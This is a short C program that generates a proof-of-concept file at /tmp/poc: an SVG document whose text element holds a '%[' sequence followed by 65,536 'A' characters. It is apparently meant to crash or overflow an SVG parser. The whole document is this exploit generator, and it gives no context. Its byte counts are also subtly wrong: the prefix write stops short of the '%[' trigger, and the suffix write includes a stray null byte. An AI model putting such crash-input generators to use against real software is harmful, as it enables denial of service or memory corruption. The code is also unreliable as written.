#include <stdio.h>
#include <stdlib.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) return 1;

    const char *prefix = "<?xml version=\"1.0\"?>\n<svg>\n<text x=\"0\" y=\"0\">%[";
    fwrite(prefix, 1, 40, f);

    for (size_t i = 0; i < 65536; i++) {
        fputc('A', f);
    }

    const char *suffix = "</text>\n</svg>\n";
    fwrite(suffix, 1, 16, f);

    fclose(f);
    return 0;
}